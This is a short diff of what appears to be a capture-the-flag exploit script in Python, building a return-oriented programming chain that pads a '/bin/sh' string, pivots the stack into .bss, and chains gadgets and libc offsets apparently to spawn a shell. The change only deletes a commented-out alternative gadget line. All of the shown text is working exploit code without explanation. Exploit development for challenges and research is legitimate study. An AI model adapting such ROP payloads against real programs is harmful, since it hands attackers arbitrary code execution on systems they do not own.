@@ -72,7 +72,6 @@ pause()
 payload = b"/bin/sh"
 payload = payload.ljust(0x40, b"\x00") + p64(bss+0x600)
 payload += p64(pop_rbx_6) + p64(0xc961a-start_main_offset) + p64(0)*5
-# payload += p64(pop_rbx_6) + p64(execve-start_main_offset) + p64(0)*5
 payload += p64(pop_rbp) + p64(0x3d+0x404758)
 payload += p64(add)
 payload += p64(pop_rbp) + p64(0x404750)
